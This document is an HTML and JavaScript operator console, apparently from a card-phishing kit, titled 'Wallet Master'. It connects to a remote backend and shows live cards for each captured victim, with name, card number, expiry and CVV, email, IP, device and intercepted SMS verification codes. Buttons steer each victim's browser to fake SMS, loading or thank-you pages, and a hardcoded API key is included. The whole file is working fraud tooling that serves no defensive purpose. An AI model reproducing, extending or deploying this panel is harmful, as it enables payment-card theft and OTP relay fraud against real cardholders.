<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master CRM - Alpha Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #000000;
            --surface: #1c1c1e;
            --primary: #5e5ce6;
            --success: #30d158;
            --warning: #ff9f0a;
            --danger: #ff453a;
            --card-width: 380px;
        }

        body {
            margin: 0;
            background: var(--bg);
            color: #ffffff;
            font-family: -apple-system, 'Outfit', sans-serif;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        header {
            padding: 1.5rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            z-index: 100;
        }

        h1 {
            margin: 0;
            font-size: 1.5rem;
            letter-spacing: -0.5px;
        }

        .deck-container {
            flex: 1;
            display: flex;
            align-items: center;
            overflow-x: auto;
            padding: 2rem;
            gap: 2rem;
            scroll-snap-type: x mandatory;
            perspective: 1000px;
        }

        .deck-container::-webkit-scrollbar {
            height: 0;
        }

        .card {
            flex: 0 0 var(--card-width);
            height: 520px;
            background: linear-gradient(135deg, #1f1f23 0%, #000000 100%);
            border-radius: 28px;
            padding: 2rem;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            scroll-snap-align: center;
            position: relative;
            transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.6s;
            border: 1px solid rgba(255, 255, 255, 0.08);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            overflow: hidden;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                transform: translateX(100px) rotateY(-20deg);
                opacity: 0;
            }

            to {
                transform: translateX(0) rotateY(0);
                opacity: 1;
            }
        }

        .card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
            border-color: rgba(255, 255, 255, 0.15);
        }

        .card.visa {
            background: linear-gradient(135deg, #1a1a4b 0%, #0c0c28 100%);
        }

        .card.mastercard {
            background: linear-gradient(135deg, #4b1a1a 0%, #280c0c 100%);
        }

        .card.amex {
            background: linear-gradient(135deg, #4b3e1a 0%, #28210c 100%);
        }

        .card.offline {
            filter: grayscale(1) brightness(0.5);
        }

        .chip {
            width: 45px;
            height: 35px;
            background: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
            border-radius: 8px;
            margin-bottom: 1.5rem;
            position: relative;
        }

        .card-number {
            font-size: 1.4rem;
            letter-spacing: 3px;
            font-weight: 600;
            margin: 1rem 0;
            font-family: monospace;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }

        .card-label {
            font-size: 0.65rem;
            color: rgba(255, 255, 255, 0.5);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 2px;
        }

        .card-val {
            font-size: 0.9rem;
            font-weight: 500;
        }

        .otp-box {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 1.5rem;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            margin: 1.5rem 0;
            backdrop-filter: blur(10px);
        }

        .otp-val {
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--warning);
            letter-spacing: 4px;
        }

        .timer-badge {
            position: absolute;
            top: 2rem;
            right: 2rem;
            background: rgba(0, 0, 0, 0.5);
            padding: 6px 14px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 0.8rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .btn {
            padding: 12px;
            border-radius: 12px;
            border: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-weight: 600;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
        }

        .btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(1.02);
        }

        .btn-success {
            background: var(--success);
            color: #000;
        }

        .btn-warning {
            background: var(--warning);
            color: #000;
        }

        .btn-danger {
            background: var(--danger);
        }

        .btn-primary {
            background: var(--primary);
        }

        /* Drag handle cursor */
        .deck-container {
            cursor: grab;
            user-select: none;
        }

        .deck-container:active {
            cursor: grabbing;
        }
    </style>
</head>

<body>
    <header>
        <h1>Wallet Master</h1>
        <div style="display: flex; align-items: center; gap: 20px;">
            <div id="connectionStatus" style="font-size: 0.8rem; color: var(--success); font-weight: 600;">Connecting...
            </div>
            <button onclick="downloadJSON()" class="btn" style="background:var(--primary)">Export History</button>
        </div>
    </header>

    <div class="deck-container" id="clientList">
        <!-- Les cartes voleront ici -->
    </div>

    <script>
        // --- Drag to Scroll Implementation ---
        const slider = document.getElementById('clientList');
        let isDown = false;
        let startX;
        let scrollLeft;

        slider.addEventListener('mousedown', (e) => {
            isDown = true;
            startX = e.pageX - slider.offsetLeft;
            scrollLeft = slider.scrollLeft;
            slider.style.cursor = 'grabbing';
        });
        slider.addEventListener('mouseleave', () => {
            isDown = false;
            slider.style.cursor = 'grab';
        });
        slider.addEventListener('mouseup', () => {
            isDown = false;
            slider.style.cursor = 'grab';
        });
        slider.addEventListener('mousemove', (e) => {
            if (!isDown) return;
            e.preventDefault();
            const x = e.pageX - slider.offsetLeft;
            const walk = (x - startX) * 2;
            slider.scrollLeft = scrollLeft - walk;
        });
    </script>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        const clientList = document.getElementById('clientList');
        const notif = document.getElementById('notif');
        const API_KEY = 'pro-audit-secret-key-2024';

        function connect() {
            const wsUrl = `wss://api-production-8591.up.railway.app/ws/admin`;
            const socket = new WebSocket(wsUrl);

            socket.onopen = async () => {
                document.getElementById('connectionStatus').textContent = 'Live Console Connected';
                // Charger le passé
                const res = await fetch('https://api-production-8591.up.railway.app/v1/admin/history', {
                    headers: { 'X-API-KEY': API_KEY }
                });
                const history = await res.json();
                history.payments.forEach(p => updateOrCreateCard(p.client_id, p));
                history.sms.forEach(s => {
                    const card = document.getElementById(`card-${s.client_id}`);
                    if (card) {
                        card.querySelector('.otp-val').textContent = s.otp;
                        card.querySelector('.otp-val').style.color = '#f59e0b';
                    }
                });
            };
            socket.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                handleMessage(msg);
            };
            socket.onclose = () => { setTimeout(connect, 3000); };
        }

        function handleMessage(msg) {
            let card = document.getElementById(`card-${msg.client_id}`);

            if (msg.type === 'NEW_PAYMENT') {
                updateOrCreateCard(msg.data.client_id, msg.data);
                notif.play().catch(() => { });
            } else if (msg.type === 'NEW_SMS') {
                card = updateOrCreateCard(msg.client_id, {});
                card.querySelector('.otp-val').textContent = msg.otp;
                card.querySelector('.otp-val').style.color = '#f59e0b';
                notif.play().catch(() => { });
            } else if (msg.type === 'CLIENT_STATUS') {
                card = updateOrCreateCard(msg.client_id, {});
                if (msg.status === 'offline') card.classList.add('offline');
                else card.classList.remove('offline');
            } else if (msg.type === 'CLIENT_EVENT' && msg.event === 'timer_update') {
                card = document.getElementById(`card-${msg.client_id}`);
                if (card) {
                    const timerBadge = card.querySelector('.timer-badge');
                    timerBadge.textContent = msg.data.timeLeft + 's';
                    timerBadge.style.color = msg.data.timeLeft < 5 ? 'var(--danger)' : '#fff';
                    timerBadge.style.background = msg.data.timeLeft < 5 ? 'rgba(239, 68, 68, 0.2)' : 'rgba(0,0,0,0.5)';
                }
            }
        }

        function updateOrCreateCard(id, data) {
            let card = document.getElementById(`card-${id}`);
            if (!card) {
                card = document.createElement('div');
                card.id = `card-${id}`;
                card.className = 'card';
                card.innerHTML = `
                    <div class="timer-badge">-</div>
                    <div class="top" style="display:flex; justify-content:space-between; align-items:flex-start;">
                        <div class="chip"></div>
                        <div style="text-align:right;">
                            <div class="card-label">Montant</div>
                            <div class="card-val amount-val" style="font-size:1.2rem; color:var(--success); font-weight:700;">-</div>
                        </div>
                    </div>

                    <div class="card-number">•••• •••• •••• ••••</div>

                    <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                        <div>
                            <div class="card-label">Propriétaire</div>
                            <div class="card-val name-val" style="text-transform:uppercase; letter-spacing:1px;">-</div>
                        </div>
                        <div style="text-align:right;">
                            <div class="card-label">Exp / CVV</div>
                            <div class="card-val exp-val">- / -</div>
                        </div>
                    </div>

                    <div style="margin-bottom:15px;">
                        <div class="card-label">Email</div>
                        <div class="card-val email-val" style="font-size:0.8rem; opacity:0.8;">-</div>
                    </div>

                    <div class="otp-box">
                        <div class="card-label">CODE DE VÉRIFICATION SMS</div>
                        <div class="otp-val">ATTENTE...</div>
                    </div>

                    <div style="display:grid; grid-template-columns: 1fr 1.5fr; gap:10px; font-size:0.7rem; margin-bottom:15px; opacity:0.8;">
                        <div><div class="card-label">IP</div><div class="ip-val">-</div></div>
                        <div><div class="card-label">Appareil</div><div class="device-val" style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">-</div></div>
                    </div>

                    <div class="controls">
                        <button onclick="redirect('${id}', 'sms')" class="btn btn-warning">SMS</button>
                        <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
                        <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">MERCI</button>
                        <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
                    </div>
                `;
                clientList.prepend(card);
            }

            if (data.full_name) {
                card.querySelector('.name-val').textContent = data.full_name;
                card.querySelector('.amount-val').textContent = data.montant + ' €';
                card.querySelector('.card-number').textContent = data.numero_carte_masque;
                card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
                card.querySelector('.email-val').textContent = data.email;
                card.querySelector('.ip-val').textContent = data.adresse_ip;
                card.querySelector('.device-val').textContent = data.device;

                // Brand specific color
                card.classList.remove('visa', 'mastercard', 'amex');
                if (data.card_brand === 'Visa') card.classList.add('visa');
                else if (data.card_brand === 'Mastercard') card.classList.add('mastercard');
                else if (data.card_brand === 'Amex') card.classList.add('amex');
            }
            return card;
        }

        async function redirect(clientId, target) {
            await fetch('https://api-production-8591.up.railway.app/v1/admin/redirect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
                body: JSON.stringify({ client_id: clientId, target: target })
            });
        }

        async function downloadJSON() {
            const res = await fetch('https://api-production-8591.up.railway.app/v1/admin/download', {
                headers: { 'X-API-KEY': API_KEY }
            });
            if (res.ok) {
                const blob = await res.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'audit_history.json';
                document.body.appendChild(a);
                a.click();
                a.remove();
            } else {
                alert("Erreur lors du téléchargement.");
            }
        }

        connect();
    </script>
</body>

</html>
